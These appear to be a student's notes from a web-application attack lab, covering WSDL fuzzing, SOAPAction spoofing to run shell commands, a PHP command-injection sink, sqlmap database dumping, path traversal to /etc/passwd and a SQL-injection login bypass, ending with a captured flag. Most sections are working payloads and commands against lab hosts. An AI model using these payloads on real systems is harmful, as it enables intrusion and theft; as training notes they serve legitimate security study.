# Web Services Description Language (WSDL)

+ http://10.129.84.113:3002/wsdl (CODE:200|SIZE:0)

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.129.84.113:3002/wsdl?FUZZ' -fs 0 -mc 20

# SOAPAction Spoofing

Simple Object Access Protocol (SOAP) - is a specification of a message beinng sentbetween two different systems. It is more formalized. It provides trusted and reliable way to send packets. 
Resource: https://blog.postman.com/soap-api-definition/

If a web service considers only an attribute 'SOAPAction' with execution, then it is vulnerable.  

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>uname -m</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://10.129.81.112:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
# Command Injection

Explanation: http://10.129.81.112:3003/ping-server.php/system/id 

```
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip); 
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd))); # function enables Command Injection
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

# Attacking WordPress 'xmlrpc.php'

# Information Disclosure  (with twist of SQLi)

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.129.81.112:3003/?FUZZ=test_value' -fs 19

sqlmap -u 'http://10.129.81.112:3003/?id=1' --dump

# LFI

Explanation: URL: http://10.129.202.133:3000/api/download/..%2f..%2f..%2fetc%2fpasswd

Feel free to use ffuf commands with seclists dictionaries in it. 
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u "http://10.129.202.133:3000/api/FUZZ"
```
```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u "http://10.129.202.133:3000/api/download/FUZZ"
```

# Skill Assessment

```

FLAG{1337_SQL_INJECTION_IS_FUN_:)}

```

```
POST /wsdl HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
SOAPAction: "Login"
Content-Type: text/xml;charset=UTF-8
Host: localhost:80
Content-Length: 404

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:LoginRequest>
         <!--type: string-->
         <tem:username>admin' or 'a'='a</tem:username>
         <!--type: string-->
         <tem:password>sonoras imperio</tem:password>
      </tem:LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>
```
